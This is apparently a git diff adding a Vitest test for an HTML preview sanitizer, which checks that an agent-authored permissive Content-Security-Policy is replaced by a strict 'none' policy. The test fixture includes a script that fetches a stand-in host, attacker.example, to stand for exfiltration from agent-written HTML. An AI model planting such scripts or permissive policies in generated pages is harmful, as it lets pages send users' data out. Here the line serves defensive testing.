@@ -14,7 +14,12 @@
 
 import { describe, expect, it } from 'vitest';
 
-import { isStaticImageSrc, stripScriptBlocks } from '@/lib/htmlSanitization';
+import {
+  injectPreviewContentSecurityPolicy,
+  isStaticImageSrc,
+  PREVIEW_CONTENT_SECURITY_POLICY,
+  stripScriptBlocks,
+} from '@/lib/htmlSanitization';
 
 describe('isStaticImageSrc', () => {
   it('accepts static relative paths', () => {
@@ -38,5 +43,26 @@ describe('stripScriptBlocks', () => {
 
     expect(stripScriptBlocks(html)).not.toContain('escapeHtml');
     expect(stripScriptBlocks(html)).toContain('assets/home.png');
+  });
+});
+
+describe('HTML preview CSP', () => {
+  it('replaces an agent-authored policy with the application policy', () => {
+    const html = injectPreviewContentSecurityPolicy(`<!doctype html>
+      <html><head>
+        <meta http-equiv="Content-Security-Policy" content="default-src *">
+      </head><body><script>fetch('https://attacker.example')</script></body></html>`);
+    const doc = new DOMParser().parseFromString(html, 'text/html');
+    const policies = doc.querySelectorAll(
+      'meta[http-equiv="Content-Security-Policy" i]'
+    );
+
+    expect(policies).toHaveLength(1);
+    expect(policies[0].getAttribute('content')).toBe(
+      PREVIEW_CONTENT_SECURITY_POLICY
+    );
+    expect(PREVIEW_CONTENT_SECURITY_POLICY).toContain("default-src 'none'");
+    expect(PREVIEW_CONTENT_SECURITY_POLICY).toContain("connect-src 'none'");
+    expect(PREVIEW_CONTENT_SECURITY_POLICY).not.toContain('https:');
   });
 });
